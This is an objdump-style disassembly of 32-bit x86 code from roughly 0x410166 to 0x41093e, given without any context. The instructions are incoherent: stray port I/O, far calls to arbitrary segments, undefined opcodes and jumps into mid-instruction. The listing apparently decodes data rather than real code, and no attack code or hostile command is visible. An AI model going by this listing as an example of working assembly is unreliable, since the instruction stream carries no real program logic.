  410166:	repnz mov ebp,0x539a580f
  41016c:	sub    al,0x9d
  41016e:	push   edi
  41016f:	mov    ch,0x7e
  410171:	mov    cl,0xf8
  410173:	fistp  QWORD PTR [ebp-0x5e]
  410176:	ret    0xc5e5
  410179:	std    
  41017a:	fdivr  DWORD PTR [ebp-0x80]
  41017d:	ja     0x410148
  41017f:	dec    esp
  410180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410181:	cli    
  410182:	out    0x31,al
  410184:	jne    0x4101e8
  410186:	mov    ebp,0x9f8ac91d
  41018b:	nop
  41018c:	scas   eax,DWORD PTR es:[edi]
  41018d:	lea    ecx,[edi]
  41018f:	outs   dx,DWORD PTR ds:[esi]
  410190:	and    al,cl
  410192:	stos   DWORD PTR es:[edi],eax
  410193:	cmp    DWORD PTR [edi],0xffffffe9
  410196:	inc    ebp
  410197:	or     eax,0xaa3f6d7d
  41019c:	or     dh,ah
  41019e:	lds    ebx,FWORD PTR [ebx+ebx*4+0x2a]
  4101a2:	xor    DWORD PTR [eax-0x6aba54e],esi
  4101a8:	mov    eax,0xc1a39cda
  4101ad:	outs   dx,DWORD PTR ds:[esi]
  4101ae:	aaa    
  4101af:	aaa    
  4101b0:	retf   0x44e9
  4101b3:	adc    eax,0xc4b0a1b1
  4101b8:	arpl   si,di
  4101ba:	sbb    dh,BYTE PTR [eax+0x4a918691]
  4101c0:	mov    DWORD PTR [esi],0x830ca74b
  4101c6:	xlat   BYTE PTR ds:[ebx]
  4101c7:	out    dx,al
  4101c8:	sbb    al,BYTE PTR fs:[ebp*8+0x41ae10b6]
  4101d0:	test   DWORD PTR [eax-0xc],ecx
  4101d3:	push   ss
  4101d4:	mov    bl,0x64
  4101d6:	push   ebp
  4101d7:	mov    BYTE PTR [ecx-0x12100899],ch
  4101dd:	js     0x410196
  4101df:	and    al,0xd2
  4101e1:	call   0x92f2:0x5be2a949
  4101e8:	dec    edi
  4101e9:	popf   
  4101ea:	push   0xffffff90
  4101ec:	fwait
  4101ed:	jl     0x410214
  4101ef:	jg     0x4101ed
  4101f1:	mov    ebp,0xa1c18cf3
  4101f6:	add    bl,cl
  4101f8:	je     0x410199
  4101fa:	in     al,dx
  4101fb:	push   ebp
  4101fc:	enter  0x6c74,0x6c
  410200:	adc    BYTE PTR [eax+eax*1],bh
  410203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410204:	les    eax,FWORD PTR [ebx+edx*8]
  410207:	test   DWORD PTR [edi+0x5f],ebx
  41020a:	neg    BYTE PTR [esi-0x665c659d]
  410210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410211:	and    eax,0x5e
  410214:	sub    eax,0xdb693aab
  410219:	shl    BYTE PTR [edi],cl
  41021b:	lods   eax,DWORD PTR gs:[esi]
  41021d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41021e:	xor    DWORD PTR [edx-0x2545c05e],edi
  410224:	pop    es
  410225:	(bad)  
  410227:	pop    eax
  410228:	jno    0x410227
  41022a:	jge    0x410204
  41022c:	call   0x6633:0xf0ff7fca
  410233:	mov    ss:0xf3e99696,al
  410239:	rep lods eax,DWORD PTR cs:[esi]
  41023c:	and    eax,0xf5fb3bf2
  410241:	aam    0xe6
  410243:	ds xchg edi,eax
  410245:	inc    edi
  410246:	out    0x84,ax
  410249:	stos   DWORD PTR es:[edi],eax
  41024a:	or     eax,0x5a21829c
  41024f:	xor    esp,DWORD PTR [edx-0x2a5e6076]
  410255:	in     eax,0xe4
  410257:	cmp    al,0x24
  410259:	loopne 0x4101dc
  41025b:	jo     0x41028b
  41025d:	aaa    
  41025e:	xor    eax,0xc161b22
  410263:	adc    ecx,DWORD PTR gs:[eax]
  410266:	and    BYTE PTR [edi-0x7d],cl
  410269:	pop    ss
  41026a:	fs cwde 
  41026c:	jge    0x4101fc
  41026e:	push   ecx
  41026f:	hlt    
  410270:	addr16 out 0x1c,eax
  410273:	dec    eax
  410274:	dec    esp
  410275:	jmp    0x5a28:0x6963d7a
  41027c:	rcl    DWORD PTR [ebp+0x7f],0x13
  410280:	ss stos BYTE PTR es:[edi],al
  410282:	sahf   
  410283:	pushf  
  410284:	outs   dx,DWORD PTR ds:[esi]
  410285:	das    
  410286:	test   eax,0xe2cf7d1d
  41028b:	or     edx,edx
  41028d:	pusha  
  41028e:	adc    eax,0x2ad16801
  410293:	cmp    eax,ebx
  410295:	inc    edi
  410296:	cmc    
  410297:	xchg   ebp,eax
  410298:	mov    ch,0x69
  41029a:	add    eax,0x708f906f
  41029f:	cmp    al,0xcd
  4102a1:	xor    al,0x0
  4102a3:	adc    eax,0x63c07ad7
  4102a8:	cmp    DWORD PTR [ecx+0x2f],edi
  4102ab:	sbb    BYTE PTR [esi-0x6ade35a6],ah
  4102b1:	xchg   esi,eax
  4102b2:	pop    ebp
  4102b3:	sbb    ebx,DWORD PTR [edx]
  4102b5:	sub    esp,edx
  4102b7:	loope  0x41026e
  4102b9:	data16 jg 0x4102b3
  4102bc:	push   0xef897daa
  4102c1:	js     0x410257
  4102c3:	int    0x76
  4102c5:	icebp  
  4102c6:	jmp    0xf008712
  4102cb:	sbb    DWORD PTR [edx+0x213a3607],ebp
  4102d1:	dec    edx
  4102d2:	push   0x70
  4102d4:	sub    DWORD PTR ds:0xd98c9f25,0x77f88604
  4102de:	jnp    0x410288
  4102e0:	dec    ebp
  4102e1:	scas   al,BYTE PTR es:[edi]
  4102e2:	loopne 0x410267
  4102e4:	cli    
  4102e5:	or     al,0x41
  4102e7:	mov    al,ds:0x5beb5a5f
  4102ec:	or     al,0x8d
  4102ee:	lods   eax,DWORD PTR ds:[esi]
  4102ef:	xor    BYTE PTR [ebp-0x19],bl
  4102f2:	out    0x12,al
  4102f4:	push   ebx
  4102f5:	mov    esi,0x3f582df0
  4102fa:	mov    ss,WORD PTR [ebp+0x31]
  4102fd:	rol    BYTE PTR [edx+ebp*4],1
  410300:	test   DWORD PTR [ebp-0x1b471dc2],edi
  410306:	jl     0x41034e
  410308:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410309:	mov    cl,0x2c
  41030b:	pop    ebx
  41030c:	fdiv   QWORD PTR [edx+0x664e0540]
  410312:	pushf  
  410313:	add    ah,0xf1
  410316:	pop    ebx
  410317:	pusha  
  410318:	rcl    BYTE PTR [ebp+0x55],1
  41031b:	gs pop ebp
  41031d:	aad    0xd
  41031f:	dec    esi
  410320:	mov    cl,0x3d
  410322:	mov    al,0x99
  410324:	push   eax
  410325:	and    al,al
  410327:	mov    BYTE PTR [ebx+0x4d],0x56
  41032b:	xor    eax,0x1115f70d
  410330:	orps   xmm0,XMMWORD PTR [ebx+0x164d68be]
  410337:	sbb    BYTE PTR [ecx+ebx*1+0x53],bh
  41033b:	mov    ch,0x60
  41033d:	sub    eax,DWORD PTR [edx]
  41033f:	adc    edi,DWORD PTR [esi-0x29af8255]
  410345:	fiadd  WORD PTR fs:[ebp+edx*4-0x78ae4379]
  41034d:	enter  0x129f,0x73
  410351:	or     ebp,DWORD PTR [edx+0x66d2973b]
  410357:	out    dx,al
  410358:	scas   al,BYTE PTR es:[edi]
  410359:	mov    esp,0xeff8bda1
  41035e:	pushf  
  41035f:	test   al,0xbb
  410361:	xor    BYTE PTR [esi+0x19],al
  410364:	xchg   edx,eax
  410365:	fnstcw WORD PTR [ebx]
  410367:	repz push es
  410369:	xchg   edi,eax
  41036a:	into   
  41036b:	cmp    BYTE PTR [edx-0x7c],al
  41036e:	xor    bh,BYTE PTR [eax-0x75cb1c6]
  410374:	mov    fs,WORD PTR [ecx+esi*4]
  410377:	cwde   
  410378:	(bad)  [esi]
  41037a:	mov    dl,0xa9
  41037c:	es push edi
  41037e:	cmp    DWORD PTR [edi-0x1ee2db26],0xda85c6b5
  410388:	push   ebp
  410389:	dec    edx
  41038b:	stos   DWORD PTR es:[edi],eax
  41038c:	in     eax,0xa0
  41038e:	ja     0x4103eb
  410390:	dec    ebp
  410391:	xor    edx,DWORD PTR [edx]
  410393:	stc    
  410394:	(bad)  
  410395:	mov    dl,0x3d
  410397:	jnp    0x410410
  410399:	cmp    BYTE PTR [eax],ah
  41039b:	adc    ch,BYTE PTR [edx+ebp*1+0x3c]
  41039f:	fbstp  TBYTE PTR ds:0x8fff907f
  4103a5:	pop    esp
  4103a6:	imul   ebp,edx,0x5b
  4103a9:	mov    al,ds:0x9b474f1d
  4103ae:	test   al,0x4a
  4103b0:	data16 sbb bh,bh
  4103b3:	std    
  4103b4:	xor    DWORD PTR [esi+0x6d06f6e7],esp
  4103ba:	add    BYTE PTR [esp-0x69ea458c],0x5d
  4103c2:	jo     0x41041c
  4103c4:	in     al,dx
  4103c5:	add    BYTE PTR [edx],ah
  4103c7:	scas   eax,DWORD PTR es:[edi]
  4103c8:	icebp  
  4103c9:	loop   0x4103d1
  4103cb:	cmp    DWORD PTR [esi+0x48409fed],esi
  4103d1:	ins    BYTE PTR es:[edi],dx
  4103d2:	mov    dl,0xd4
  4103d4:	dec    edi
  4103d5:	jp     0x410389
  4103d7:	lds    edx,FWORD PTR [ebx-0x3016bf67]
  4103dd:	inc    esp
  4103de:	push   0xffffffa1
  4103e0:	pop    esi
  4103e1:	jmp    0x2dcd:0x1ba1749d
  4103e8:	mov    ch,0x53
  4103ea:	mov    ah,0x62
  4103ec:	pop    esi
  4103ed:	mov    esi,0x4b23f5b2
  4103f2:	jecxz  0x410473
  4103f4:	pop    ebp
  4103f5:	adc    al,0x5b
  4103f7:	and    bh,ch
  4103f9:	adc    dh,ah
  4103fb:	mov    ds:0x3405d006,al
  410400:	rol    bl,0xda
  410403:	scas   eax,DWORD PTR es:[edi]
  410404:	sbb    BYTE PTR [esi+ebp*1],cl
  410407:	and    al,0x7d
  410409:	jb     0x4103a0
  41040b:	aas    
  41040c:	jge    0x41048a
  41040e:	or     al,0x2b
  410410:	(bad)  
  410411:	js     0x41041f
  410413:	(bad)  
  410414:	cmc    
  410415:	pop    ebx
  410416:	xchg   BYTE PTR [ebp-0x6c0871a9],al
  41041c:	mov    eax,ds:0xf4a7e778
  410421:	xor    eax,0xd72df881
  410426:	std    
  410427:	xor    esi,esi
  410429:	stos   BYTE PTR es:[edi],al
  41042a:	iret   
  41042b:	into   
  41042c:	xchg   ecx,eax
  41042d:	sti    
  41042e:	out    dx,al
  41042f:	inc    ebp
  410430:	push   ds
  410431:	data16 xlat BYTE PTR es:[ebx]
  410434:	jle    0x410403
  410436:	arpl   WORD PTR [esi-0x44],si
  410439:	movups xmm6,xmm5
  41043c:	into   
  41043d:	push   esp
  41043e:	int3   
  41043f:	mov    ebp,0x5c89bdb
  410444:	cdq    
  410445:	jbe    0x410452
  410447:	stos   DWORD PTR es:[edi],eax
  410448:	mov    edx,0x10107b4f
  41044d:	(bad)  
  41044e:	fimul  DWORD PTR [edi+0x4f]
  410451:	push   DWORD PTR [eax+eax*8+0x6b59b7a]
  410458:	(bad)  
  410459:	out    0x8b,al
  41045b:	xor    BYTE PTR [eax+eax*8],dl
  41045e:	leave  
  41045f:	push   cs
  410460:	outs   dx,BYTE PTR ds:[esi]
  410461:	push   eax
  410462:	push   esi
  410463:	std    
  410464:	mov    ah,0x58
  410466:	sbb    eax,0xbbd64dc6
  41046b:	push   edx
  41046c:	dec    edi
  41046d:	leave  
  41046e:	dec    ebp
  41046f:	jo     0x4104e4
  410471:	scas   al,BYTE PTR es:[edi]
  410472:	retf   0x6aaf
  410475:	imul   ebp,DWORD PTR [edx],0x55
  410478:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41047a:	xor    dl,ch
  41047c:	mov    edx,0x7405c77c
  410481:	test   al,0xd7
  410483:	je     0x4104f5
  410485:	xchg   ebp,eax
  410486:	xchg   ebx,eax
  410487:	and    bl,BYTE PTR [ebp+0x66]
  41048a:	aaa    
  41048b:	add    edx,ebx
  41048d:	sub    al,0x1e
  41048f:	sbb    al,BYTE PTR [edx+ebp*8-0x1a7543a8]
  410496:	mov    dh,0x13
  410498:	shr    eax,1
  41049a:	in     al,0x5b
  41049c:	mov    fs,WORD PTR [esi-0x2d]
  41049f:	loop   0x4104a9
  4104a1:	(bad)  
  4104a2:	ins    BYTE PTR es:[edi],dx
  4104a3:	daa    
  4104a4:	enter  0x11ba,0xcc
  4104a8:	sbb    BYTE PTR [ebx+0x6aaa4a3e],dh
  4104ae:	in     al,0x43
  4104b0:	sahf   
  4104b1:	mov    al,0x70
  4104b3:	icebp  
  4104b4:	sub    al,0x7b
  4104b6:	fistp  DWORD PTR [eax-0x4d]
  4104b9:	int    0x87
  4104bb:	repnz fsubr DWORD PTR es:[edx-0x25ac6882]
  4104c3:	push   cs
  4104c4:	test   al,0x36
  4104c6:	sbb    edx,esp
  4104c8:	popf   
  4104c9:	dec    edx
  4104ca:	fmul   DWORD PTR [ecx-0x17ffd059]
  4104d0:	push   eax
  4104d1:	jge    0x4104e1
  4104d3:	test   BYTE PTR [esi+0x21c544d5],bh
  4104d9:	push   0xffffffdd
  4104db:	push   cs
  4104dc:	cli    
  4104dd:	mov    esi,0x860ce14
  4104e2:	sahf   
  4104e3:	in     eax,0x51
  4104e5:	mov    ch,0x9a
  4104e7:	xor    eax,0x9fad29c3
  4104ec:	outs   dx,BYTE PTR ds:[esi]
  4104ed:	sti    
  4104ee:	lods   al,BYTE PTR ds:[esi]
  4104ef:	cli    
  4104f0:	and    cl,BYTE PTR [esi]
  4104f2:	jmp    0x375d3f26
  4104f7:	in     eax,dx
  4104f8:	pop    edi
  4104f9:	jmp    DWORD PTR [ecx+0x68f93966]
  4104ff:	mov    ds:0xdb2c982d,al
  410504:	jmp    0x61a54b14
  410509:	(bad)  
  41050a:	adc    BYTE PTR [edx+edi*4+0x79],bh
  41050e:	pop    es
  41050f:	shl    DWORD PTR [eax+0xb2ba992],cl
  410515:	ds pop esp
  410517:	stos   DWORD PTR es:[edi],eax
  410518:	push   ebp
  410519:	neg    BYTE PTR [ecx+esi*8+0x626492e5]
  410520:	das    
  410521:	(bad)  
  410522:	loope  0x410564
  410524:	sub    ch,BYTE PTR [ecx+0x37d03206]
  41052a:	jno    0x4104c1
  41052c:	dec    edx
  41052d:	fisubr DWORD PTR ds:0xd9dab35a
  410533:	inc    esi
  410534:	in     eax,dx
  410535:	data16 test al,0x80
  410538:	jbe    0x41057d
  41053a:	ins    DWORD PTR es:[edi],dx
  41053b:	inc    edi
  41053c:	(bad)  
  41053d:	(bad)  
  41053f:	dec    esp
  410540:	enter  0x157d,0x5f
  410544:	scas   al,BYTE PTR es:[edi]
  410545:	dec    edx
  410546:	enter  0xc685,0x8a
  41054a:	jbe    0x410526
  41054c:	add    al,0x1d
  41054e:	fisub  WORD PTR [ecx]
  410550:	(bad)  
  410551:	fs int3 
  410553:	xchg   DWORD PTR [esi+ecx*4+0x71360577],eax
  41055a:	or     al,0x97
  41055c:	mov    eax,ds:0x478a2b10
  410561:	rol    DWORD PTR [esi-0x40156325],1
  410567:	ret    0x9416
  41056a:	sbb    eax,DWORD PTR [ebx]
  41056c:	push   esi
  41056d:	jge    0x4104fd
  41056f:	fbld   TBYTE PTR [esi-0x239b3121]
  410575:	out    dx,eax
  410576:	shl    edx,cl
  410578:	ret    
  410579:	mov    ecx,edx
  41057b:	cmp    dl,BYTE PTR [ebp+0x277bf45b]
  410581:	outs   dx,BYTE PTR ds:[esi]
  410582:	adc    eax,0x529afe56
  410587:	dec    esi
  410588:	dec    ebp
  410589:	add    cl,BYTE PTR [ecx-0x1f67a274]
  41058f:	mov    cl,0x6b
  410591:	fs retf 
  410593:	jnp    0x410526
  410595:	in     eax,dx
  410596:	sub    DWORD PTR [ebx-0x16],ebp
  410599:	ja     0x4105e0
  41059b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41059c:	(bad)  [eax]
  41059e:	(bad)  
  41059f:	sub    eax,DWORD PTR [edx-0x53cb421b]
  4105a5:	test   al,0x7b
  4105a7:	push   es
  4105a8:	mov    dh,BYTE PTR [ebx-0x6c]
  4105ab:	dec    esi
  4105ac:	jmp    0x27ee:0xcef095c2
  4105b3:	mov    ds:0xb3b25c1d,al
  4105b8:	nop
  4105b9:	xor    BYTE PTR [ebp+0x6],dh
  4105bc:	add    al,0x5
  4105be:	pop    ebp
  4105bf:	adc    DWORD PTR [eax+0x626a710f],eax
  4105c5:	pop    esi
  4105c6:	and    dl,BYTE PTR [esi-0x39]
  4105c9:	pop    esi
  4105ca:	and    BYTE PTR [edi],0xde
  4105cd:	out    0xe8,al
  4105cf:	pop    edi
  4105d0:	jb     0x41057d
  4105d2:	cmp    BYTE PTR [edi+eiz*4],ch
  4105d5:	rol    BYTE PTR [edx-0xa],1
  4105d8:	test   al,0x3b
  4105da:	out    dx,eax
  4105db:	xor    DWORD PTR [ecx-0x4d],edx
  4105de:	stc    
  4105df:	add    esp,DWORD PTR [ecx+0x4e11f9]
  4105e5:	cmp    ah,0x4
  4105e8:	outs   dx,BYTE PTR ds:[esi]
  4105e9:	into   
  4105ea:	mov    cl,0x10
  4105ec:	fldenv [ecx]
  4105ee:	fldcw  WORD PTR [edi*8+0xa0d7a9e]
  4105f5:	fist   DWORD PTR [edx+0x7b004cf7]
  4105fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105fc:	sub    eax,0xa4eb23ee
  410601:	mov    ah,0xb7
  410603:	scas   al,BYTE PTR es:[edi]
  410604:	pop    esp
  410605:	(bad)  
  410606:	or     BYTE PTR [edx],bh
  410608:	aam    0xee
  41060a:	dec    ebx
  41060b:	adc    DWORD PTR [ebx+0x4efe1227],0xffffffdc
  410612:	adc    BYTE PTR [esi],ch
  410614:	pop    ebp
  410615:	aas    
  410616:	(bad)  
  410617:	cmp    bl,cl
  410619:	fisub  DWORD PTR [edx+0x4e36514e]
  41061f:	push   ecx
  410620:	mul    ebp
  410622:	(bad)  
  410623:	pusha  
  410624:	mov    edi,0x705d18ab
  410629:	sub    BYTE PTR [edi+0x0],ah
  41062c:	out    0x2e,al
  41062e:	or     BYTE PTR [edi-0x2b],bl
  410631:	ins    DWORD PTR es:[edi],dx
  410632:	ins    DWORD PTR es:[edi],dx
  410633:	cmp    eax,0x41b5ba72
  410638:	pop    eax
  410639:	add    ebp,DWORD PTR [eax+0x63]
  41063c:	mov    ds:0x1a874d64,eax
  410641:	jns    0x4105ed
  410643:	xchg   ebp,eax
  410644:	push   eax
  410645:	xor    BYTE PTR [edi-0x52dd25e0],ch
  41064b:	clc    
  41064c:	and    al,BYTE PTR [ecx+ecx*4-0x62]
  410650:	iret   
  410651:	push   es
  410652:	(bad)  
  410653:	xlat   BYTE PTR ds:[ebx]
  410654:	push   es
  410655:	(bad)  
  410657:	jecxz  0x4105ee
  410659:	ins    BYTE PTR es:[edi],dx
  41065a:	push   ebp
  41065b:	mov    DWORD PTR [esi],0xa42b5036
  410661:	dec    edi
  410662:	scas   al,BYTE PTR es:[edi]
  410663:	or     eax,0x962f34ce
  410668:	adc    cl,ch
  41066a:	(bad)  
  41066b:	ret    0x6d5
  41066e:	aaa    
  41066f:	outs   dx,DWORD PTR ds:[esi]
  410670:	pop    ss
  410671:	mov    ch,0xa7
  410673:	into   
  410674:	mov    ebp,DWORD PTR [ebp+0x31]
  410677:	lea    eax,[ebx-0x50]
  41067a:	or     al,dh
  41067c:	mov    ch,0xd8
  41067e:	into   
  41067f:	btr    DWORD PTR [edi+0x5a1bc28],edx
  410686:	or     al,cl
  410688:	lods   eax,DWORD PTR ds:[esi]
  410689:	rcr    DWORD PTR [ebx],0xf7
  41068c:	je     0x41062b
  41068e:	ins    BYTE PTR es:[edi],dx
  41068f:	daa    
  410690:	(bad)  
  410691:	std    
  410692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410693:	adc    al,0x4a
  410695:	sbb    bl,al
  410697:	sub    edx,ecx
  410699:	inc    BYTE PTR [eax-0x5d8bc35f]
  41069f:	xchg   esp,eax
  4106a0:	and    ecx,DWORD PTR [ebx]
  4106a2:	jmp    DWORD PTR [ebx+0x4c79387]
  4106a8:	inc    edi
  4106a9:	out    0x6d,al
  4106ab:	add    al,0x9e
  4106ad:	jbe    0x410703
  4106af:	dec    edi
  4106b0:	pop    es
  4106b1:	(bad)  
  4106b2:	mov    edi,0xd888a6e2
  4106b7:	mov    DWORD PTR [eax+0x6b],ecx
  4106ba:	mov    esp,edi
  4106bc:	test   edx,eax
  4106be:	inc    esi
  4106bf:	mov    bl,0xbc
  4106c1:	sbb    ch,dh
  4106c3:	test   eax,0xc81612de
  4106c8:	stos   BYTE PTR es:[edi],al
  4106c9:	jns    0x410701
  4106cb:	adc    al,BYTE PTR [ebx-0x1aa97ef9]
  4106d1:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106d3:	cli    
  4106d4:	sbb    DWORD PTR [eax-0x68],ebp
  4106d7:	scas   eax,DWORD PTR es:[edi]
  4106d8:	cmp    edx,ecx
  4106da:	loope  0x410698
  4106dc:	fnstcw WORD PTR [eax]
  4106de:	inc    esp
  4106df:	and    bl,BYTE PTR [edi+0x28816ce6]
  4106e5:	dec    esi
  4106e6:	push   edx
  4106e7:	in     al,dx
  4106e8:	and    al,0x3c
  4106ea:	cli    
  4106eb:	fsubr  DWORD PTR [ebx-0x5b]
  4106ee:	popa   
  4106ef:	dec    esp
  4106f0:	xor    eax,0xffffffeb
  4106f3:	dec    esp
  4106f4:	dec    ecx
  4106f5:	cli    
  4106f6:	gs jmp 0x29c4:0xdaa67574
  4106fe:	add    DWORD PTR [ebx],ecx
  410700:	sar    BYTE PTR [ebp+eax*1+0x63],1
  410704:	stos   BYTE PTR es:[edi],al
  410705:	fst    QWORD PTR [ebx+0x6d7abff3]
  41070b:	repnz hlt 
  41070d:	xchg   DWORD PTR [eax-0x2f],edi
  410710:	and    BYTE PTR [edi+0x5a4d2eb8],0x73
  410717:	adc    al,BYTE PTR [ecx]
  410719:	push   ebp
  41071a:	adc    ch,BYTE PTR [ebx-0x6e]
  41071d:	icebp  
  41071e:	mov    eax,ds:0xaad75dc0
  410723:	scas   al,BYTE PTR es:[edi]
  410724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410725:	jb     0x4106ba
  410727:	jl     0x410758
  410729:	stos   DWORD PTR es:[edi],eax
  41072a:	fucom  st(5)
  41072c:	dec    ecx
  41072d:	inc    edi
  41072e:	or     eax,eax
  410730:	add    BYTE PTR [edx+0x6efcae1d],0xcf
  410737:	pop    edx
  410738:	mov    ds:0x7c180511,eax
  41073d:	adc    BYTE PTR [esi+edi*4-0x2b],bl
  410741:	outs   dx,DWORD PTR ds:[esi]
  410742:	rcr    bl,0xc1
  410745:	dec    ecx
  410746:	mov    ah,0xd9
  410748:	sbb    BYTE PTR ds:0xd5c1b4a,cl
  41074e:	add    eax,0x19ec0848
  410753:	push   cs
  410754:	jge    0x4106f4
  410756:	ficomp DWORD PTR [ebp+0x78]
  410759:	sub    edi,DWORD PTR [ebx+0x78]
  41075c:	inc    ecx
  41075d:	enter  0xd4a3,0x48
  410761:	aad    0x7f
  410763:	pusha  
  410764:	mov    dh,0x70
  410766:	not    BYTE PTR [esi+0x245f8df5]
  41076c:	inc    ecx
  41076d:	mov    ah,0x7b
  41076f:	mov    bl,0x82
  410771:	inc    ebp
  410772:	pop    ss
  410773:	stos   DWORD PTR es:[edi],eax
  410774:	cmp    ecx,DWORD PTR [esi]
  410776:	push   ebx
  410777:	cld    
  410778:	mov    ss,esp
  41077a:	ds je  0x4107e2
  41077d:	lahf   
  41077e:	sti    
  41077f:	jg     0x41073b
  410781:	iret   
  410782:	xlat   BYTE PTR ds:[ebx]
  410783:	or     BYTE PTR [ebp-0x52980174],al
  410789:	bound  ecx,QWORD PTR [edx-0x11]
  41078c:	sub    al,0xa4
  41078e:	outs   dx,BYTE PTR ds:[esi]
  41078f:	push   ss
  410790:	pop    ecx
  410791:	cmp    al,0xb8
  410793:	add    al,0xcc
  410795:	or     eax,0x7e0feae
  41079a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41079b:	push   eax
  41079c:	cmp    DWORD PTR [edx],edi
  41079e:	adc    dl,BYTE PTR [edi+0x12498fbd]
  4107a4:	add    esi,DWORD PTR [edi-0x7c]
  4107a7:	das    
  4107a8:	cmp    eax,0xe604b794
  4107ad:	jle    0x4107d3
  4107af:	clc    
  4107b0:	mov    dl,BYTE PTR [edx-0x5ab8f161]
  4107b6:	sahf   
  4107b7:	xor    eax,0x7630b03f
  4107bc:	in     al,0xbf
  4107be:	test   eax,0xedd2026b
  4107c3:	sub    eax,0xb891af6f
  4107c8:	jne    0x410780
  4107ca:	dec    DWORD PTR [eax-0x504243a0]
  4107d0:	or     al,0x4c
  4107d2:	pop    ebp
  4107d3:	or     BYTE PTR [edi+eiz*1-0x9a7d053],0x1
  4107db:	and    BYTE PTR [edx],cl
  4107dd:	mov    eax,ds:0x44640942
  4107e2:	stos   DWORD PTR es:[edi],eax
  4107e3:	xchg   esi,eax
  4107e4:	mov    esi,0x4a6b6e4
  4107e9:	pop    esi
  4107ea:	(bad)
  4107ed:	sub    al,0xf6
  4107ef:	je     0x4107d2
  4107f1:	cmp    BYTE PTR [ecx-0x4700f9b2],al
  4107f7:	mov    ds:0x8bc76f9,al
  4107fc:	aam    0x1a
  4107fe:	jmp    0xd4c3c59a
  410803:	pop    edi
  410804:	xchg   edx,eax
  410805:	inc    esi
  410806:	pop    ecx
  410807:	xor    eax,0x520f0a7
  41080c:	outs   dx,DWORD PTR ds:[esi]
  41080d:	scas   eax,DWORD PTR es:[edi]
  41080e:	add    eax,0x7ec29afd
  410813:	in     al,0xd6
  410815:	push   ebx
  410816:	jnp    0x4107d5
  410818:	cmc    
  410819:	mov    ebp,0xc99b3efc
  41081e:	fist   WORD PTR [ebx]
  410820:	sbb    dl,0xc0
  410823:	dec    ebp
  410824:	call   0x7b78:0x8a6e2290
  41082b:	xchg   esi,eax
  41082c:	mov    ebx,0xd4e521d1
  410831:	sub    BYTE PTR [edx-0x43],cl
  410834:	push   esi
  410835:	push   edx
  410836:	mov    edi,0xe1d21efe
  41083b:	mov    bh,0x10
  41083d:	iret   
  41083e:	mov    eax,0xd3f5e905
  410843:	xrelease xchg DWORD PTR [ebp+0x4af72224],edx
  41084a:	call   0x7e5e:0x22a4fe0b
  410851:	lods   al,BYTE PTR ds:[esi]
  410852:	sbb    eax,0x85612cb2
  410857:	cs ret 0xaffa
  41085b:	sub    dl,ch
  41085d:	call   0x26e6:0x92c25a75
  410864:	dec    edi
  410865:	mov    bl,0xf3
  410867:	xchg   BYTE PTR [esi+0x34],bh
  41086a:	or     BYTE PTR [esi],0xd2
  41086d:	in     eax,0x5
  41086f:	dec    ecx
  410870:	pop    es
  410871:	in     al,dx
  410872:	dec    eax
  410873:	icebp  
  410874:	ins    DWORD PTR es:[edi],dx
  410875:	mov    ecx,0xc60fec10
  41087a:	cwde   
  41087b:	ja     0x4108f1
  41087d:	add    ah,BYTE PTR [ebp-0x17]
  410880:	and    al,0xa7
  410882:	push   ds
  410883:	div    bl
  410885:	jl     0x41085e
  410887:	lea    ebx,[ebp+0x746e75f1]
  41088d:	adc    DWORD PTR [ecx+ebx*2+0x62],esi
  410891:	xchg   edi,eax
  410892:	stos   BYTE PTR es:[edi],al
  410893:	add    DWORD PTR [eax-0x184e08d3],ecx
  410899:	aaa    
  41089a:	dec    ebp
  41089b:	aad    0x9
  41089d:	xor    esi,DWORD PTR [ecx]
  41089f:	loopne 0x410890
  4108a1:	test   BYTE PTR [ebx+0x35],cl
  4108a4:	mov    ebx,0x6bd0bebb
  4108a9:	lock in eax,dx
  4108ab:	enter  0x15e4,0x62
  4108af:	cmp    ecx,DWORD PTR [eax+edi*4-0x87a6843]
  4108b6:	stos   DWORD PTR es:[edi],eax
  4108b7:	lea    eax,[ebx+0x5e71e331]
  4108bd:	test   al,0xc4
  4108bf:	inc    ebx
  4108c0:	test   BYTE PTR [esi+0x2b],0x8b
  4108c4:	cmp    esi,DWORD PTR [ecx+0x138e3c86]
  4108ca:	xchg   ebx,eax
  4108cb:	sub    eax,DWORD PTR [eax+0x777ef634]
  4108d1:	pusha  
  4108d2:	pusha  
  4108d3:	inc    esi
  4108d4:	hlt    
  4108d5:	arpl   cx,sp
  4108d7:	dec    edx
  4108d8:	pushf  
  4108d9:	jb     0x410957
  4108db:	mov    edx,0x41b5a5b2
  4108e0:	nop
  4108e1:	mov    ah,0xbb
  4108e3:	call   0x9adc:0x7002e132
  4108ea:	mov    eax,0xc4d7b6d7
  4108ef:	std    
  4108f0:	xchg   esi,eax
  4108f1:	push   esp
  4108f2:	mov    eax,0x317ad691
  4108f7:	inc    eax
  4108f8:	jbe    0x410925
  4108fa:	cmp    edx,DWORD PTR [eax-0x58]
  4108fd:	enter  0x92e7,0x47
  410901:	mov    ah,0x52
  410903:	call   0x6e4d:0x40e
  410909:	or     cl,BYTE PTR [esi-0x1ba7cba8]
  41090f:	std    
  410910:	pusha  
  410911:	shl    DWORD PTR [esi+ebp*4+0x64d7aa57],cl
  410918:	or     eax,0x7b5c2f23
  41091d:	pop    ds
  41091e:	popa   
  41091f:	lahf   
  410920:	jae    0x4108d2
  410922:	stos   BYTE PTR es:[edi],al
  410923:	mov    edi,0x871b755c
  410928:	or     DWORD PTR [ebx+0x40],eax
  41092b:	sbb    DWORD PTR [ebx+0x79c1fe0c],edx
  410931:	cli    
  410932:	mov    ebx,0x67878557
  410937:	daa    
  410938:	out    0x4c,eax
  41093a:	nop
  41093b:	or     ebx,ebx
  41093d:	lods   eax,DWORD PTR ds:[esi]
  41093e:	xor    ecx,DWORD PTR [eax]
